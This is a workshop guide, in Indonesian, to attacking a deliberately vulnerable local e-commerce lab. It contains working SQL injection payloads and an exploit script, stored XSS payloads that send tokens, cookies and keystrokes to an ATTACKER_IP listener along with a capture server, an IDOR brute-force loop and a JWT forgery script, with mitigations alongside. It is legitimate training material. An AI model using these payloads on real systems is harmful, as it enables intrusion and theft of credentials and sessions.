# 🛡️ ShopVuln — Attack Documentation
## CyberSecurity Workshop | Web Vulnerability Lab

> **⚠️ DISCLAIMER:** Aplikasi ini dibuat **sengaja vulnerable** hanya untuk keperluan edukasi dan workshop CyberSecurity. **JANGAN** deploy di environment production atau gunakan teknik ini pada sistem tanpa izin.

---

## 📋 Daftar Vulnerability

| # | Tipe | Lokasi | Severity |
|---|------|--------|----------|
| 1 | SQL Injection (Auth Bypass) | `POST /api/auth/login` | 🔴 Critical |
| 2 | SQL Injection (UNION Attack) | `GET /api/products?search=` | 🔴 Critical |
| 3 | Stored XSS | `POST /api/products/:id/reviews` | 🔴 Critical |
| 4 | Stored XSS (Bio) | `POST /api/auth/register` | 🟠 High |
| 5 | Google Dork / Info Disclosure | `/backup/`, `/config/`, `/robots.txt` | 🟠 High |
| 6 | IDOR | `GET /api/orders?user_id=` | 🟠 High |
| 7 | Plaintext Password Storage | Database `users` table | 🟠 High |
| 8 | JWT Secret Hardcoded | `server.js` | 🟡 Medium |
| 9 | Verbose Error Messages | Semua endpoint DB error | 🟡 Medium |

---

## 🗺️ Arsitektur & URL Penting

```
Frontend  → http://localhost:3000
Backend   → http://localhost:5000
Database  → localhost:3306 (shopvuln)

Halaman:
  /             → Home (product listing)
  /login        → Login page
  /register     → Register page
  /dashboard    → User dashboard (auth required)
  /cart         → Cart & checkout
  /admin        → Admin panel (admin role required)
  /products/:id → Product detail + reviews (XSS)

API Endpoints:
  POST /api/auth/login
  POST /api/auth/register
  GET  /api/products?search=&category=&sort=
  GET  /api/products/:id/reviews
  POST /api/products/:id/reviews
  GET  /api/orders?user_id=
  GET  /api/admin/users
  GET  /api/health

Exposed Files (Google Dork):
  /robots.txt
  /backup/db_backup_2024.sql
  /config/config.txt
  /admin/notes.txt
```

---

## 🔴 1. SQL Injection — Authentication Bypass

### Konsep
SQL Injection terjadi ketika input user langsung digabungkan ke query SQL tanpa sanitasi.

### Kode Vulnerable (backend/server.js)
```javascript
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```

### 🎯 Payload: Auth Bypass Login sebagai Admin

Field **Username:**
```
admin' -- 
```
Password: *(apapun)*

Query terbentuk:
```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'apapun'
```

Alternatif:
```
admin'#
' OR '1'='1' -- 
' OR 1=1 -- 
```

### 🎯 Payload: UNION Attack — Dump Semua User

Search bar di halaman Home:
```
' UNION SELECT 1,username,email,password,role,6,7,8,9 FROM users -- 
```

Full URL:
```
http://localhost:5000/api/products?search=' UNION SELECT 1,username,email,password,role,6,7,8,9 FROM users -- 
```

### 🎯 Payload: Dump Secret Config

```
' UNION SELECT 1,config_key,config_value,4,5,6,7,8,9 FROM site_config -- 
```

### 🛠️ Python Exploit Script

```python
#!/usr/bin/env python3
# sqli_exploit.py
import requests

BASE_URL = "http://localhost:5000"

def sqli_auth_bypass(user="admin"):
    payload = f"{user}' -- "
    r = requests.post(f"{BASE_URL}/api/auth/login",
                      json={"username": payload, "password": "x"})
    if r.status_code == 200:
        data = r.json()
        print(f"[+] Auth Bypass OK! User: {data['user']}")
        print(f"[+] Token: {data['token'][:60]}...")
    else:
        print(f"[-] Failed: {r.json()}")

def sqli_dump_users():
    payload = "' UNION SELECT 1,username,email,password,role,6,7,8,9 FROM users -- "
    r = requests.get(f"{BASE_URL}/api/products", params={"search": payload})
    print(f"[*] Dump Users — Status: {r.status_code}")
    for row in r.json():
        print(f"  user={row.get('name')} pass={row.get('price')} role={row.get('category')}")

def sqli_dump_config():
    payload = "' UNION SELECT 1,config_key,config_value,4,5,6,7,8,9 FROM site_config -- "
    r = requests.get(f"{BASE_URL}/api/products", params={"search": payload})
    for row in r.json():
        print(f"  {row.get('name')}: {row.get('description')}")

sqli_auth_bypass()
sqli_dump_users()
sqli_dump_config()
```

### 🔒 Mitigasi SQLi

```javascript
// Gunakan parameterized queries
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
db.query(query, [username, password], callback);
```

---

## 🟠 2. Cross-Site Scripting (XSS)

### Konsep
XSS terjadi saat input user ditampilkan di browser tanpa sanitasi. ShopVuln menggunakan `dangerouslySetInnerHTML` untuk render review.

### 🎯 Payload: Basic Alert

Di form review halaman product:
```html
<script>alert('XSS Workshop!')</script>
```

### 🎯 Payload: Steal JWT Token

```html
<script>fetch('http://ATTACKER_IP:8888?jwt='+localStorage.getItem('token'))</script>
```

### 🎯 Payload: Cookie Stealing

```html
<script>new Image().src='http://ATTACKER_IP:8888?c='+document.cookie</script>
```

### 🎯 Payload: Keylogger

```html
<script>document.addEventListener('keypress',e=>fetch('http://ATTACKER_IP:8888?k='+e.key))</script>
```

### 🎯 Payload: img/svg (CSP bypass)

```html
<img src=x onerror=alert(document.domain)>
<svg onload="alert('SVG XSS')">
```

### 🎯 Payload: Page Defacement

```html
<script>document.body.innerHTML='<div style="position:fixed;inset:0;background:red;display:flex;align-items:center;justify-content:center;font-size:72px;color:#fff;z-index:9999">HACKED!</div>'</script>
```

### 🛠️ Attacker Server (Python)

```python
#!/usr/bin/env python3
# attacker_server.py — tangkap stolen data
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        params = parse_qs(urlparse(self.path).query)
        print("\n[🎯 STOLEN DATA]", params)
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
    def log_message(self, *a): pass

HTTPServer(('0.0.0.0', 8888), Handler).serve_forever()
```

Run: `python3 attacker_server.py`

### 🔒 Mitigasi XSS

```javascript
// Backend — sanitasi sebelum simpan
const sanitizeHtml = require('sanitize-html');
const clean = sanitizeHtml(comment, { allowedTags: [] });

// Frontend — jangan pakai dangerouslySetInnerHTML
// Ganti: <div dangerouslySetInnerHTML={{__html: r.comment}} />
// Dengan: <div>{r.comment}</div>
```

---

## 🟠 3. Google Dork / Information Disclosure

### Konsep
File sensitif yang tidak sengaja terekspos di web root bisa ditemukan lewat Google Dork operators.

### Google Dork Operators

| Operator | Kegunaan |
|----------|----------|
| `site:target.com filetype:sql` | Cari file SQL |
| `site:target.com inurl:backup` | Cari folder backup |
| `site:target.com inurl:config` | Cari file config |
| `intitle:"index of"` | Directory listing |

### 🎯 Target Files di ShopVuln

| URL | Isi Sensitif |
|-----|-------------|
| `http://localhost:5000/robots.txt` | Daftar path tersembunyi |
| `http://localhost:5000/backup/db_backup_2024.sql` | Username + password admin plaintext |
| `http://localhost:5000/config/config.txt` | DB creds + JWT secret + API key |
| `http://localhost:5000/admin/notes.txt` | Kredensial admin + TODO security fixes |
| `http://localhost:5000/api/health` | Server info disclosure |

### 🛠️ Dork Scanner (Python)

```python
#!/usr/bin/env python3
# dork_scanner.py
import requests

TARGET = "http://localhost:5000"
PATHS = [
    "/robots.txt", "/backup/db_backup_2024.sql",
    "/config/config.txt", "/admin/notes.txt",
    "/.env", "/api/health", "/.git/config",
]

for path in PATHS:
    r = requests.get(f"{TARGET}{path}", timeout=5)
    icon = "🟢" if r.status_code == 200 else "🔴"
    print(f"{icon} [{r.status_code}] {path}")
    if r.status_code == 200 and any(
        kw in r.text.lower() for kw in ['password','secret','key']
    ):
        print(f"   ⚠️  SENSITIVE KEYWORD FOUND!")
```

### 🔒 Mitigasi Dork

```bash
# Jangan letakkan file sensitif di web root
# Gunakan .gitignore & .dockerignore
echo "*.sql\n*.env\nconfig.txt" >> .gitignore

# robots.txt yang aman — jangan reveal sensitive paths
echo "User-agent: *\nDisallow: /" > robots.txt
```

---

## 🟠 4. IDOR (Insecure Direct Object Reference)

### Konsep
Akses resource orang lain dengan mengubah ID di parameter URL.

### 🎯 Serangan: Lihat Order User Lain

Login sebagai customer biasa, lalu:
```bash
# Lihat order milik user ID=1 (admin)
curl -H "Authorization: Bearer YOUR_TOKEN" \
  "http://localhost:5000/api/orders?user_id=1"

# Brute force semua user
for i in $(seq 1 10); do
  echo "=== User $i ==="
  curl -s -H "Authorization: Bearer YOUR_TOKEN" \
    "http://localhost:5000/api/orders?user_id=$i"
done
```

### 🔒 Mitigasi IDOR

```javascript
// Ambil ID dari JWT, bukan dari input
const userId = req.user.id; // Tidak bisa dimanipulasi attacker
```

---

## 🟡 5. JWT Secret Hardcoded + Token Forgery

### 🎯 Serangan: Forge Admin Token

JWT Secret didapat dari `/config/config.txt`:
```
JWT_SECRET=super_secret_jwt_key_2024_do_not_share
```

```python
#!/usr/bin/env python3
# forge_jwt.py
import jwt  # pip install PyJWT

SECRET = "super_secret_jwt_key_2024_do_not_share"
fake = {"id": 999, "username": "hacker", "role": "admin", "email": "h@evil.com"}
token = jwt.encode(fake, SECRET, algorithm="HS256")
print(f"[+] Forged token:\n{token}")
print(f'\ncurl -H "Authorization: Bearer {token}" http://localhost:5000/api/admin/users')
```

---

## 📊 Full Attack Chain (Kill Chain)

```
1. [Recon]        → GET /robots.txt          → Reveals /backup/, /config/
2. [Info Gather]  → GET /backup/*.sql         → Admin plaintext passwords
                  → GET /config/config.txt    → JWT_SECRET + API keys
3. [Access]       → SQLi: admin' --           → Login bypass
                  → Credentials from backup   → Direct login
4. [Escalation]   → Forge JWT with secret     → Admin role
                  → GET /api/admin/users      → All passwords leaked
5. [Impact]       → Stored XSS in review      → Steal tokens from all visitors
                  → IDOR                      → Access all user orders
```

---

## 🚀 Cara Menjalankan Lab

```bash
cd E-Commerce
docker compose up --build
# Tunggu ±2 menit

# Akses:
# Frontend  → http://localhost:3000
# Backend   → http://localhost:5000
# MySQL     → localhost:3306
```

### Akun Test

| Username | Password | Role |
|----------|----------|------|
| `admin` | `admin123` | Admin |
| `bob_admin` | `bob2024!` | Admin |
| `john_doe` | `password123` | Customer |
| `jane_smith` | `qwerty` | Customer |

---
*CyberSecurity Workshop — ShopVuln Lab*
